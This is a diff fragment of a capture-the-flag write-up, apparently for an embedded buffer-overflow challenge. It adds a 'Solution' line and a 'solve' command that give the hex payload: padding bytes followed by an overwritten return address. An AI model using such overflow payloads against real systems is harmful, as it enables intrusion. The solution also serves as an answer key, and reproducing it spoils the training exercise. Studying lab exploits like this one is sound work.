@@ -55,6 +55,8 @@ The first word is the return address back to `<login>`, followed by 16-byte buff
 
 `a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5 + 4c45 + 3645 + 7f00`
 
+**Solution: in HEX `a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a54c4536457f00`.**
+
 ```sh
 > solve
 a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a54c4536457f00
